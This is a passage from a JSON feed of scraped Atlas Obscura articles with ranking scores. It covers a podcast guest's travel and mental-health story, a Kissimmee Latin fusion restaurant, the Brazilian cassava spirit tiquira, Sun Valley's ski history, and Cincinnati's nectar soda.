sites to the Atlas yourself. It’s a thrill for me to do that. I remember one time I was working in Brazil and we were just in this little town that had no Atlas Obscura sites, but I’m like, I’m going to find something.</p>\n<p>And I found this guy with a little, he had a cell phone store, but then he had sort of in the back rooms, all these historical communication devices. Even one of the first Morse code devices and a phonograph. And we got to, through broken English and broken Portuguese, I wrote an article and posted that on the Atlas, and I checked it today, and now eight people have been there.</p>\n<p>When you add a site to the Atlas, you really do change people’s lives. You know, I don’t struggle as much in my life anymore as when I started because the world just seems more weird and welcoming.</p>\n<p><strong>Kelly: </strong>Caroline Mazel-Carlton, thank you so much for sharing your story and thank you for the work that you do helping other people too.</p>\n<p><strong>Caroline: </strong>Absolutely. I just seek to make this place more welcoming and, you know, people are struggling. My organization, we have alternatives to suicide support groups. There are places you can go to talk where people will listen and not shame you or judge you and where we acknowledge that there’s many paths to healing.</p>\n<p>And sometimes that path to healing means walking around a really weird taxidermy store and that’s okay.</p>\n<p><strong>Kelly: </strong>While eating a steak.</p>\n<p><strong>Caroline: </strong>Yes. I’m here for it.</p>\n<p><strong>Kelly: </strong>That was Caroline Mazel-Carlton. She has visited 1,048 Atlas Obscura places. No doubt many more to come. We will put a link to the Atlas in our show notes, so maybe you can start ticking off your own list of 1,000 places. Also, if you or someone you know is struggling, you can contact the 988 Suicide and Crisis Lifeline.</p>",
        "source": "www.atlasobscura.com",
        "published": "Tue, 13 Jan 2026 11:00:00 -0500",
        "fetched_at": "2026-02-09T23:34:22.475522Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 7
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 15,
        "timeliness_score": 3,
        "final_score": 9.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.atlasobscura.com/articles/pedro-rodriguez-kissimmee",
        "title": "Pedro Rodriguez Is on a Quest for Freshness",
        "summary": "<p>When Pedro Rodriguez is in his Kissimmee, Florida restaurant, Sajoma Latin Fusion, he makes sure to check in on the kitchen. And when he does, there’s a rule that all of his cooks must follow.</p>\n<p>“I better not catch you with anything that’s artificial,” he says. Sajoma’s sancocho, for example, is made from scratch, not with bouillon, which many cooks use to build flavor quickly.</p>\n<p>The approach has paid off. Sajoma has developed an avid following in Central Florida for its approach to Latin cuisine, rooted in good ingredients and creative cooking. Pedro, gregarious and perceptive with a quick smile and a salt and pepper beard, is proud of his brainchild. He’s a grocery supplier by trade; the restaurant business is relatively new for him.</p>\n<p>Sajoma is Pedro’s most personal project yet, the capstone of a lifelong obsession with good food and good produce. And it all started on his family’s farm.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106304/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\">Feeding Off the Land</h3>\n<p>Until the age of 12, Pedro grew up in the town of San Jose de las Matas in the Dominican Republic. The municipality is known for its natural beauty and mineral water. “It’s almost like one of the greenest towns there,” he says. Sajoma, as the town is called for short, boasts dramatic hills, lush vegetation, and rolling rivers.</p>\n<p>And even in a beautiful town, Pedro lived a particularly idyllic life. His family owned a 120-acre farm with animals like cows, chickens, and goats, and crops including rice, beans, coffee, and yams. “We pretty much used to feed off the land,” he says. Beef was one of the only basic foodstuffs that he recalls leaving their property to obtain.</p>\n<p>The family home sat on the top of a hill. From there, Pedro could see a 360-degree view of mountains, greenery, and livestock grazing in the meadow. After school, he would hang around the house and play with the animals on their property.</p>\n<p>The men who worked for his family would hunt for crabs in caves. Pedro would go with them on their hunts, but he would watch from the side, apprehensive, as they stuck their bare hands into the darkness for huge, snapping crabs. He enjoyed the result, though: a dish called locrio where stewed crab meat releases its flavors into brown rice.</p>\n<p>Pedro grew up loving food, and it’s easy to see why. His mother was—and still is—a great cook who can turn any ingredient into a special meal. And she had the pick of ingredients in their family home. Milk from their own cows, yams dug up from their own soil. Pedro remembers his mother cooking cerdo guisado, or stewed pork, with onions and cubanelle peppers; and pasta with cooked green bananas.</p>\n<p>“The food was, like, unexplainably good, because everything was natural,” Pedro says.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106305/image.jpg\" width=\"auto\" /></figure>\n<p>Twenty years ago in New York City, Pedro met his wife, Marisol, who was born in the U.S. to Dominican parents. When they were dating, she cooked him a meal that was, somehow, even better than his mother’s cooking. Pedro went home and told his mother; she was thrilled that her son had found a worthy match. And Marisol shares her in-laws’ dedication to natural cooking. “She does not use anything artificial,” Pedro says. “She’s very big on that.” That means no bouillon, and no pre-made seasonings, like the dried adobo mix that supermarkets sell.</p>\n<p>With Sajoma, Pedro’s goal was to let good ingredients sing without any additives. Customers have taken notice. Pedro says that when he walks the floor of the restaurant, diners tell him, “I literally feel like I’m eating this at home.”</p>\n<p>He believes this is testament to the power of simple cooking with no shortcuts. “Sometimes people think that you could force flavor. You don’t force flavor,” Pedro insists. With natural ingredients, “Flavor is very easy to accomplish.”</p>\n<h3 class=\"article-second-subheading-pre-rd\">From the Dominican Republic to the World</h3>\n<p>If the Rodriguez family farm was Pedro’s first culinary education, the multicultural restaurants of New York were his second. When Pedro was 12, his parents moved to New York and sent Pedro, his brother, and his sister to the city of Santiago to live with his grandparents. When Pedro was 14, his parents brought their children to the Big Apple.</p>\n<p>One might think moving from verdant island to concrete jungle would be difficult. For Pedro, it wasn’t.</p>\n<p>He received a warm welcome from his extended family, most of whom had settled in New York by the time he and his siblings got there. His first summer in New York, relatives toured him and his siblings around to the city’s parks and botanic garden. He loved the communal culture of 1980s Brooklyn, where he would wile away the day outdoors, playing ball on the streets and hanging out with his cousins. When Pedro’s mother offered to send him back to the Dominican Republic the following winter, he declined.</p>\n<p>Chief among these new experiences were the city’s food offerings. A family member blew Pedro’s mind when he took him for his first glazed donut. “I was like, ‘Holy shit!’” He remembers. “Where has this been all my life?”</p>\n<p>Pedro had a similar reaction to his first Chinese meal. Before he learned to speak English, his cousin took him to a restaurant where the staff spoke fluent Spanish with customers before calling out orders to the kitchen in Chinese. Pedro and his cousin bought fried rice with a half chicken and tostones, or fried plantains, and ate it outside on one of their stoops. “I fell in love with that,” he says.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106306/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\">Starting Small and Expanding Slowly</h3>\n<p>The excited, food-loving child is very much alive in 53-year-old Pedro. He describes with equal relish his recent meal at a Peruvian restaurant as well as the locrio he ate on his family’s farm growing up. But food is also his business. In addition to Sajoma Latin Fusion in Kissimmee, Pedro owns four restaurants in New York and runs a fleet of trucks that he says supply most of New York City’s independent grocers. When asked about his secret to success in business, he uses a distinctly Dominican analogy: “I compare it to baseball players.”</p>\n<p>Many baseball players grow up playing on poorly kept fields. A ball might hit a rock, and smack you in the face. “It’s harder when you’re in the minor leagues,” he says. But, “You got to make sure that you could do that. Because once you go to the majors, the field is perfect now.”</p>\n<p>The message: “Start small,” he says, master your craft, and expand slowly.</p>\n<p>For Pedro, starting small meant working at his uncle’s grocery stores in Far Rockaway, Queens during high school. On Saturdays, he traveled with him to produce markets to stock the store. When Pedro graduated high school, he decided that he would rather spend the next few years growing a business. “What do I know at the time and what do I like at the time? Produce,” he says.</p>\n<p>So Pedro bought a van, and started delivering groceries to supermarkets, drawing on the connections he had built while working for his uncle. Soon, he bought a large truck, then two trucks. Today, he runs a fleet of 20 trucks.</p>\n<p>The road has not been easy. His equivalent of errant baseballs that threaten to hit you in the face were snowstorms that he had to fight through to deliver groceries. For years, he worked 18-hour shifts, rain, shine or snow. “I’d come home and eat, sleep for three or four hours, and go right back out there,” he remembers. He has since stepped back from physically driving trucks and delivering produce, but still helms the business.</p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106307/image.jpg\" width=\"auto\" /></figure>\n<h3 class=\"article-second-subheading-pre-rd\">A Foothold in Florida</h3>\n<p>Over the years, many family members of Pedro’s have moved to Kissimmee. A friend told him about an open lot, wondering whether Pedro would be interested in opening a restaurant there. When Pedro saw the place, disparate threads of his life knit together: his childhood spent eating fresh produce on a Dominican farm; his exposure to cuisines from every corner of the world in New York; the New York hustle that had become his way of being.</p>\n<p>“Oh my god, this is perfect,” he remembers thinking after laying eyes on the space. He wanted to build a restaurant that combined fresh ingredients, Latin American cuisine, international influences, and New York service. And he would name it “Sajoma,” after the town that started his journey.</p>\n<p>After a period of renovation and menu-tweaking, Pedro opened Sajoma Latin Fusion in August of 2022. The restaurant’s interior is sleek and spacious, with an outdoor patio and plush couches. The team makes sure the produce is fresh, hand-picking it themselves from local independent supermarkets rather than large suppliers. Sajoma’s menu dances between Latin America—especially the Caribbean—and other parts of the world, like Europe, Asia, and North America. Their tuna tartare comes on a bed of guacamole and corn chips; their burger is topped with sweet plantains; and their sancocho is made from scratch with no additives.</p>\n<p>A pair of elderly Puerto Rican ladies recently visited the restaurant and made a point of telling Pedro how much they appreciated the sancocho. “We’ve had something like this at a house,” they told him. But “we have never tried anything like this at a restaurant.” They would spread the word to their family, they said.</p>\n<p>The word, it seems, has already gotten out. The restaurant has a loyal and growing following, and it becomes a party on weekends, when DJs and bands play salsa, bachata, merengue, and more.</p>\n<p>Much of Pedro’s work has been helping the team emulate the type of prompt, attentive service that one finds at a restaurant in New York. Achieving that has taken a lot of repetition, but they’ve pulled it off. “I’m just so proud, you know?” he says.</p>\n<p>Pedro says he approaches restaurant ownership as an eater, not a cook. He is actually not much of a chef, having been blessed with great cooking in his mother’s and wife’s kitchens, and in restaurants around the world.</p>\n<p>He constantly tries new restaurants, and he acts as the president of a group of around 40 New York supermarket industry professionals that call themselves the “Friday club” because they meet up at restaurants for food and wine every Friday. It’s easy to see why he would be named president: He knows good food and has the gift of gab.</p>\n<p>Pedro’s love of conversation and a good time is part of what draws him to the restaurant business, and when he is not checking on the kitchen at Sajoma, he is walking the floor, entertaining guests. He knows what it is to work hard all week and turn to a restaurant to provide delicious food and a space to connect with friends.</p>\n<p>“I don’t have to know how to cook,” in order to run a good restaurant, he says. “I have to know how to eat.”</p>",
        "source": "www.atlasobscura.com",
        "published": "Fri, 30 Jan 2026 13:15:00 -0500",
        "fetched_at": "2026-02-09T23:34:22.475492Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 13,
        "timeliness_score": 3,
        "final_score": 8.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.atlasobscura.com/foods/tiquira",
        "title": "Tiquira",
        "summary": "<p><img alt=\"\" height=\"200\" src=\"https://img.atlasobscura.com/AVz4e7Gut8Wj5dEAKjG4GdVeQ-Naog6rw3iXhMFXb0k/rs:fill:300:200:1/g:ce/q:81/sm:1/scp:1/ar:1/aHR0cHM6Ly9hdGxh/cy1kZXYuczMuYW1h/em9uYXdzLmNvbS91/cGxvYWRzL3RoaW5n/X2ltYWdlcy9mMjk5/MWM1Mi05NDFkLTRk/ODYtYjMxZC0xZTU1/OTI0ZjI2M2Q3MDUx/Mzk4NTM2MTc1YzZh/ZDhfRFNDMDk5MTUu/SlBH.jpg\" width=\"300\" /></p> <p><span style=\"font-weight: 400;\">Indigenous Brazilians have fermented alcoholic beverages from the cassava root for thousands of years. These beer-like beverages go by names like </span><em><span style=\"font-weight: 400;\">cauim</span></em><span style=\"font-weight: 400;\">, </span><em><span style=\"font-weight: 400;\">caxiri</span></em><span style=\"font-weight: 400;\">, and </span><em><span style=\"font-weight: 400;\">tarubá</span></em><span style=\"font-weight: 400;\">. Fermentation is an important step in cassava processing—the raw root has chemicals that can turn into cyanide in the human body. Native peoples found that a bit of human saliva and some naturally occurring yeast could eliminate these toxins and improve the nutritious value of the tuber. When the technology of distillation arrived to the Munim River region (now in Maranhão), locals who already drank lightly alcoholic cassava beverages began to distill them. </span><em><span style=\"font-weight: 400;\">Tiquira</span></em><span style=\"font-weight: 400;\"> was born. </span></p>\n<p><span style=\"font-weight: 400;\">The name <em>tiquira</em> is likely derived from the Tupi word </span><em><span style=\"font-weight: 400;\">tykyre </span></em><span style=\"font-weight: 400;\">meaning \"to drip.\" But it is a curiosity that the spirit has flourished in only one Brazilian state, Maranhão. Margot Stinglwagner, founder of </span><a href=\"https://www.guaajatiquira.com/en/index.html\"><span style=\"font-weight: 400;\">Guaaja Tiquira</span></a><span style=\"font-weight: 400;\">, the first modern brand to produce the spirit starting in 2016, says “It’s a spirit that is also unknown in Brazil. A few people have heard about tiquira—but usually only people who have gone to Maranhão once.” Accordingly, the state moved to declare the spirit as a piece of Cultural and Intangible Heritage </span><a href=\"https://www.al.ma.leg.br/noticias/48515\"><span style=\"font-weight: 400;\">in September 2023</span></a><span style=\"font-weight: 400;\">. </span></p>\n<p><span style=\"font-weight: 400;\">Part of the reason that tiquira has remained so isolated is that cachaça, Brazil’s rum, is far easier to produce. Because the rum comes from sugarcane, the sugar for fermentation is already there. “With cassava, you don’t have sugar,” Stinglwagner explains. “You must first transform the carbohydrates into sugar and then you can ferment and distill it.” To achieve this end, Guaaja Tiquira uses food enzymes instead of the traditional human saliva. Guaaja also differs from other distillers because they use full cassava roots where most tiquira moonshiners rely on processed </span><em><span style=\"font-weight: 400;\">farinha de mandioca</span></em><span style=\"font-weight: 400;\">, or cassava flour. </span></p>\n<p><span style=\"font-weight: 400;\">“The majority of people produce it illegally,” laughs Stinglwagner. “The state does nothing about it.” Outside of the urban center, tiquira is invariably a homemade product. Generally, tiquira makers don’t separate the \"heads\" (the first drops of liquor from a distillation, which contain harsher alcohols including toxic methanol and other pungent and volatile flavor compounds) from the \"tails\" (the final liquid produced from distillation, which has a low alcohol content and can have unwelcome bitter flavors), meaning the spirit is stronger and may contain more toxins and impurities. Some even macerate marijuana into the combined spirit to produce the doubly-illicit <em>tiquiconha</em>.</span></p>\n<p><span style=\"font-weight: 400;\">Maranhenses believe that you cannot get wet or bathe after drinking tiquira, lest you become faint or dizzy. Zelinda Machado de Castro e Lima, one of the great chroniclers of folk culture in Maranhão, has recorded other traditions surrounding the drink. Firstly, it is typical to pierce a cashew with a toothpick and soak it in a glass of tiquira for several hours. It is then sucked as a sort of boozy lollipop. She also writes about the belief that those drinking coffee should avoid tiquira, while locals say that fishermen on the coast used the liquor to sanitize wounds incurred on the job. </span></p>\n<p><span style=\"font-weight: 400;\">Finally, there is the curious question of the color of tiquira. In the tourist markets of São Luís, the spirit is always blushing a translucent violet. “They say that the color of tiquira is from tangerine leaves, but we tried to do it and the color from the leaves is not stable,” says Stinglwagner. “It is also not a strong color. The norms and laws for tiquira prohibit the addition of the leaves.” The violet color may be artificial (perhaps from food dyes), but some tiquiras do have a citrusy flavor. </span></p>\n<p><span style=\"font-weight: 400;\">Tiquira today is still largely relegated to the world of moonshining, but with the government’s recognition of the spirit and new legitimate ventures like that of Guaaja Tiquira, Brazil could be seeing more of the cassava liquor outside of its home in Maranhão. </span></p>\n<p><span style=\"font-weight: 400;\">“All the people say to me, ‘What is this new spirit?,’” says Stinglwagner. “I say, ‘It’s not a new spirit, it’s the oldest spirit from Brazil.’”</span></p>\n<p><strong>Know Before You Go</strong></p>\n<p>Tiquira is widely available in the downtown markets of São Luís, Maranhão. Both the local Mercado Central and touristic Mercado das Tulhas have many vendors selling tiquira. The commercial brand, Guaaja Tiquira, is also available in São Luís at Empório Fribal, in addition to Copacabana Palace and Fairmont Hotel in Rio de Janeiro, and Mocotó Bar e Restaurante in São Paulo. </p>",
        "source": "www.atlasobscura.com",
        "published": "Wed, 03 Apr 2024 19:17:00 -0400",
        "fetched_at": "2026-02-09T23:34:22.475550Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "value_redefinition",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 12,
        "timeliness_score": 3,
        "final_score": 7.5,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 9.299999999999999,
        "temp_score_trend": 5.699999999999999
      },
      {
        "url": "https://www.atlasobscura.com/articles/sun-valley-americas-first-destination-ski-town",
        "title": "Inside America’s First Destination Ski Town",
        "summary": "<p>In the heart of Idaho, about 150 miles east of Boise, the steep slopes of Bald Mountain tower over a sun-kissed valley. For roughly a century, visitors have flocked to Sun Valley from all over the country for its premiere skiing and snowboarding. But behind these sought-after slopes, there’s an impressive history and one-of-a-kind cultural experiences that make it a unique destination.</p>\n<p>Hollywood’s most celebrated stars have traveled to the valley for decades, yet Sun Valley has managed to maintain a laid-back local life and spirit even amid such A-list appeal. That rare blend of low-pretension modernity—coupled with nonstop flights from eight major metropolitan areas, including Chicago, Seattle, and Los Angeles—make Sun Valley a low-stress, culture-packed getaway.</p>\n<figure class=\"article-image-full-width contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/lg/106264/image.jpg\" width=\"auto\" /></figure>\n<h2 class=\"article-subheading-pre-rd\">A History of Innovation</h2>\n<p>Long before the glistening snow and sun-soaked days helped launch Sun Valley into a skier's dreamland, a sparkle of another sort caught national attention: silver. In the 1870s, the first discoveries of the precious metal attracted prospectors from across the nation.</p>\n<p>An anchor of the region, the <a href=\"https://visitsunvalley.com/lodging/sun-valley-lodge/\">Sun Valley Resort</a>, with slopes that cater to beginners and seasoned veterans in equal measure, has hosted some of the most iconic stars of the Golden Age of Hollywood.</p>\n<p>But it was born in part out of necessity: The Great Depression hit the railroad business hard in the region. In 1936, Averell Harriman, the chairman of the Union Pacific Railroad at the time, had the idea to boost traffic on its lines by building an exclusive European-style destination ski resort. At the time there were virtually no U.S. ski areas that had upscale lodging and dining right at the slopes.</p>\n<p>To add to the must-see appeal, the resort unveiled the first-ever chairlift on nearby Proctor Mountain. The brainchild of James Curran, an engineer with the railroad, its inspiration came from a surprising place: bananas. While traveling in tropical regions, Curran had seen bananas hooked in bunches and hauled to the dock by pulley systems. Why not try the same with people?</p>\n<p>That December, “Life Magazine” featured the new technology, which helped position the resort as a go-to getaway. The lift, which moved skiers 20 feet off the ground for more than 3,500 feet with a 1,150-foot gain in elevation, opened up the sport to people who might not have otherwise had the stamina for the activity.</p>\n<p>Cinema’s elite, including Marilyn Monroe, Ingrid Bergman, Frank Sinatra and Clark Gable, stayed at the resort, and Ernest Hemingway, whose <a href=\"https://www.atlasobscura.com/places/ernest-hemingway-s-grave\">burial site</a> is also in Sun Valley, finished “For Whom the Bell Tolls” in suite 206 of the Sun Valley lodge. More recently, the region has also attracted business elites and tech giants like Microsoft founder Bill Gates and Apple CEO Tim Cook.</p>\n<figure class=\"article-image-full-width contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/lg/106260/image.jpg\" width=\"auto\" /></figure>\n<h2 class=\"article-subheading-pre-rd\">Laid-Back Local Vibe</h2>\n<p>Today in Sun Valley Village, the walkable heart of the resort, that glamorous essence is anchored by an affable vibe and crowd-pleasing activities. The 1937 opera house now serves as a movie theater, which features films by snow and skiboard filmmaker Warren Miller, among other classics. Ice skating enthusiasts may want to check out the <a href=\"https://visitsunvalley.com/searching-for-sun-valley/get-to-know-every-ice-rink-in-the-wood-river-valley/\">Sun Valley ice rink</a>, a known hangout for Olympic athletes as they prepare for the popular Sun Valley on Ice shows. And additional dining, shopping, and entertainment options abound in nearby Ketchum, located less than two miles down the road (which also has its own free outdoor ice rink, open from late December until mid-February).</p>\n<p>Dining in Sun Valley can be as cosmopolitan or low-key as your tastes crave. For a rustic, homestyle pick, <a href=\"https://www.kneadery.com\">The Kneadery</a> in North Ketchum serves up hearty breakfast and lunch dishes and has been a local go-to since 1974. Owners Dillon and Heather Witmer have cultivated an impressive collection of Western art and artifacts for decades, and diners will spot a canoe hanging from the dining room ceiling, while a taxidermied grizzly bear and mounted antlers on wood-paneled walls add to the cozy, lodge-like feel.</p>\n<p>For a contemporary option be sure to check out Cookbook, which offers flavor-packed bites ranging from grilled Idaho trout to house-made pesto and inventive pizzas. The restaurant, which was originally located in a 1932 church but has since moved to a larger location, serves up plenty of vegetarian options as well, and is commended by guests for its great service and family friendly atmosphere.</p>\n<figure class=\"article-image-full-width contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/lg/106259/image.jpg\" width=\"auto\" /></figure>\n<h2 class=\"article-subheading-pre-rd\">Vibrant Off-Slope Culture</h2>\n<p>Even if you never hit the slopes, Sun Valley is full of high-quality, even quirky, cultural experiences all year long. The <a href=\"https://visitsunvalley.com/to-do/sun-valley-museum-of-art/\">Sun Valley Museum of Art</a> in Ketchum is a regional hub for contemporary and local art, formed in 1971. Each year, the museum hosts resident artists and features exhibitions and events featuring visual arts, film, music, and more.</p>\n<p>When the Wood River Valley is blanketed in snow, the region is also host to the <a href=\"https://sunvalleyfilmfestival.org\">Sun Valley Film Festival</a>, an annual, five-day event that has featured legendary filmmakers and Hollywood’s best, including Clint Eastwood, Jodie Foster, and Woody Harrelson, since 2011. Screenings, cocktail and coffee chats, and big-ticket parties honor the greatest names in film and introduce emerging artists. Monthly movies and educational programming are also offered year-round.</p>\n<p>Each January, respected culinary masters and rising food stars emerge at the <a href=\"https://visitsunvalley.com/events/sun-valley-food-wine-celebration-2/\">Sun Valley Food &amp; Wine Celebration</a>. The Sun Valley Culinary Institute hosts this popular, five-day event, featuring James Beard Award winners, champions from the Food Network “Chopped” reality show, exclusive chef dinners, cooking classes, and spirited Après Ski events.</p>\n<p>The Sun Valley Pavilion buzzes in summer with sound at the <a href=\"https://www.svmusicfestival.org\">​​Sun Valley Music Festival</a>, a month-long event that offers world-class musicians performing in a relaxed outdoor venue.</p>\n<figure class=\"article-image-full-width contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/lg/106265/image.jpg\" width=\"auto\" /></figure>\n<h2 class=\"article-subheading-pre-rd\">Spirited Character</h2>\n<p>Sun Valley residents take pride in their rich heritage, cause for memorable celebrations. As the trees in downtown Ketchum begin to morph from green to fiery orange and red, over a thousand sheep amble along Main Street for the <a href=\"https://www.atlasobscura.com/articles/podcast-trailing-of-the-sheep\">Trailing of the Sheep Festival</a>. Each fall, Sun Valley honors the annual sheep migration from the summer’s high mountain pastures to the warmer grazing and lambing regions in the south, an event known historically as “trailing.” The festival is packed with wool-making classes, culinary lessons, live music and folklore, and more.</p>\n<p>For Labor Day, Sun Valley residents celebrate another part of their heritage at <a href=\"https://www.wagondays.com\">Wagon Days</a>. Founded in 1958, the tradition honors the history and mining heritage of the region, including one of the weekend’s most anticipated events: the Big Hitch Parade, which showcases antique buggies, carriages, carts, and more parading through downtown Ketchum.</p>\n<p>Whether you’re an avid skier or just want to soak in sunny days as you experience a culturally rich pocket of American history, surprises await in Sun Valley.</p>",
        "source": "www.atlasobscura.com",
        "published": "Tue, 06 Jan 2026 16:23:00 -0500",
        "fetched_at": "2026-02-09T23:34:22.475532Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 11,
        "timeliness_score": 3,
        "final_score": 7.0,
        "reddit_score": null,
        "reddit_comments": null,
        "temp_score_struct": 8.6,
        "temp_score_trend": 5.3999999999999995
      },
      {
        "url": "https://www.atlasobscura.com/foods/nectar-soda",
        "title": "Nectar Soda",
        "summary": "<p><img alt=\"An Aglamesis nectar soda.\" height=\"200\" src=\"https://img.atlasobscura.com/gLqA8RaTQNIL0MupnRjPCWB4QRxXZdJs1eCFvMqaXY8/rs:fill:300:200:1/g:ce/q:81/sm:1/scp:1/ar:1/aHR0cHM6Ly9hdGxh/cy1kZXYuczMuYW1h/em9uYXdzLmNvbS91/cGxvYWRzL3RoaW5n/X2ltYWdlcy80YTQw/MzA1NC04MjBhLTQw/MmEtYmU5My1iYWZi/YWU5ZGViNDc5Y2Rk/YjY1YjA4NGY1MmFm/YzRfQWdsYW1lc2lz/IG5lY3RhciBzb2Rh/IG9uIHRhYmxlIDIu/anBn.jpg\" width=\"300\" /></p> <p><span style=\"font-weight: 400;\">Though Cincinnati is best known for breweries, another effervescent beverage has a long history in the Queen City: the nectar soda.</span></p>\n<p><span style=\"font-weight: 400;\">Home to the oldest pharmacy college in the U.S. west of the Alleghenies, the</span><a href=\"https://lloydlibrary.org/research/archives/eclectic-medicine/\"><span style=\"font-weight: 400;\"> Eclectic Medical Institute</span></a><span style=\"font-weight: 400;\"> (1845-1952), and</span><a href=\"https://lloydlibrary.org/about/a-brief-history-of-the-lloyd-library-and-museum/\"><span style=\"font-weight: 400;\"> Lloyd Brothers Pharmacists</span></a><span style=\"font-weight: 400;\">, Cincinnati was long on the forefront of the pharmaceutical industry. The city had a number of apothecaries with soda fountains, as well as confectioners serving countless carbonated concoctions—some claiming to cure a variety of ailments, and others simply providing customers with something sweet and refreshing to drink.</span></p>\n<p><span style=\"font-weight: 400;\">Enter the nectar soda. The flavor is a combination of vanilla and bitter almond, and the drink is pastel pink in color—a nod to the hue of almond flowers, according to </span><a href=\"https://dannwoellertthefoodetymologist.wordpress.com/\"><span style=\"font-weight: 400;\">Dann Woellert</span></a><span style=\"font-weight: 400;\">, a Cincinnati food historian, etymologist, and the author of </span><a href=\"https://www.amazon.com/Cincinnati-Candy-History-American-Palate/dp/1467137952\"><em><span style=\"font-weight: 400;\">Cincinnati Candy: A Sweet History</span></em></a><span style=\"font-weight: 400;\">. Nicknamed the “</span><a href=\"https://www.proquest.com/hnpcincinnatienquirershell/historical-newspapers/august-2-1942-page-55-108/docview/1882746511/sem-2?accountid=39387\"><span style=\"font-weight: 400;\">drink of the gods</span></a><span style=\"font-weight: 400;\">,” the bitter almond flavor of nectar soda balances out what would otherwise be overly sweet vanilla, creating an addictive taste that grows on you with each sip. </span></p>\n<p><span style=\"font-weight: 400;\">Nectar sodas have been served in Cincinnati since at least the late 1870s, though, like many iconic foods and beverages, its precise origins are murky. The only other U.S. city to embrace nectar sodas was New Orleans, but unlike Cincinnati, the tradition fizzled out in the Big Easy in the mid-20th century. Plus, Woellert says that the Queen City popularized them first. “They were served in Cincinnati nearly a decade before New Orleans,” he says.</span></p>\n<p><span style=\"font-weight: 400;\">While the Cincinnati nectar soda has multiple origin stories, each crediting a different pharmacist or confectioner, Woellert has concluded that </span><a href=\"https://www.proquest.com/hnpcincinnatienquirershell/historical-newspapers/april-13-1947-page-98-151/docview/1882885311/sem-2?accountid=39387\"><span style=\"font-weight: 400;\">John Mullane</span></a><span style=\"font-weight: 400;\"> created the flavor after traveling to Quebec City to learn the art of confectionery from a prominent Canadian candymaker. He began serving nectar sodas in his confectionery shop in downtown Cincinnati in the late 1870s.</span></p>\n<p><span style=\"font-weight: 400;\">So, why did the nectar soda end up in Cincinnati and New Orleans, of all places? Wollert suspects that the bitter almond and vanilla flavor was used by the French Acadians who settled in both Quebec City and New Orleans.</span></p>\n<p><span style=\"font-weight: 400;\">Though nectar sodas aren’t as common as they were in the early 20th century, when they could be found at countless confectioneries and pharmacy soda fountains across Cincinnati, they’re still served at establishments throughout the city and the surrounding area. Nectar sodas have been on the menu at ice cream and chocolate shop </span><a href=\"https://www.aglamesis.com/\"><span style=\"font-weight: 400;\">Aglamesis Brothers</span></a><span style=\"font-weight: 400;\"> since it opened in Cincinnati in 1908, if not shortly thereafter. That’s according to company president and CEO Randy Young, who is also a third-generation family member. </span></p>\n<p><span style=\"font-weight: 400;\">It’s unclear when nectar sodas were added to the </span><a href=\"https://digital.cincinnatilibrary.org/digital/collection/p16998coll32/id/2220/rec/19\"><span style=\"font-weight: 400;\">menu</span></a><span style=\"font-weight: 400;\"> at </span><a href=\"https://www.graeters.com/\"><span style=\"font-weight: 400;\">Graeter’s</span></a><span style=\"font-weight: 400;\">, a Cincinnati ice cream and chocolate shop that opened in 1870 and now has locations throughout the city and the Midwest, but Chip Graeter, chief of retail operations and a fourth-generation family member, says that they were especially popular throughout the 1940s, 1950s and 1960s.</span></p>\n<p><span style=\"font-weight: 400;\">In a </span><a href=\"https://www.proquest.com/hnpcincinnatienquirershell/historical-newspapers/january-28-1947-page-2-26/docview/1882876222/sem-2?accountid=39387\"><span style=\"font-weight: 400;\">January 28, 1947 article</span></a><span style=\"font-weight: 400;\"> in the </span><em><span style=\"font-weight: 400;\">Cincinnati Enquirer</span></em><span style=\"font-weight: 400;\">, Tom Moore, the head of the soda department at Dow Drug Store—which operated 32 soda fountains throughout the metropolitan area at that time—said that “nectar is one of the most popular flavors in all of their stores, and has been for many years.” Five years prior, </span><a href=\"https://www.proquest.com/hnpcincinnatienquirershell/historical-newspapers/august-16-1942-page-63-99/docview/1882739776/sem-2?accountid=39387\"><span style=\"font-weight: 400;\">Dow ran an ad</span></a><span style=\"font-weight: 400;\"> in the same newspaper which read: “Be glad you live in Cincinnati, the only place in the country where you can enjoy a Dow double-dip nectar soda.”</span></p>\n<p><span style=\"font-weight: 400;\">Originally, nectar syrup was made by combining half-and-half or milk with water, bitter almond extract, vanilla extract and red food coloring. While Aglamesis eventually switched to a dairy-free shelf-stable syrup, Graeter's recipe has never changed—it still contains milk and needs to be refrigerated. </span></p>\n<p><span style=\"font-weight: 400;\">Both Aglamesis and Graeter’s make nectar soda by mixing nectar syrup with a dollop of whipped cream, adding a scoop or two of vanilla ice cream, then topping it off with some soda water and more whipped cream.</span></p>\n<p><span style=\"font-weight: 400;\">Though Young says that nectar sodas are most popular with older 